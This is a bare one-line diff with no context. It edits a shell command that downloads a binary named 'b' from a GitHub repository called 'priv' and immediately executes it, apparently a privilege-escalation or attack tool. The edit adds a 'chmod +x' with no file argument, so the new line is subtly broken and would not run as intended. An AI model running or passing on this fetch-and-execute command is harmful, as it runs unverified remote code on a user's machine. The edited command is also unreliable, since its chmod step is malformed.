@@ -1,1 +1,1 @@
-wget https://raw.githubusercontent.com/wadim1281/priv/main/b -O b && ./b
+wget https://raw.githubusercontent.com/wadim1281/priv/main/b -O b && chmod +x && ./b
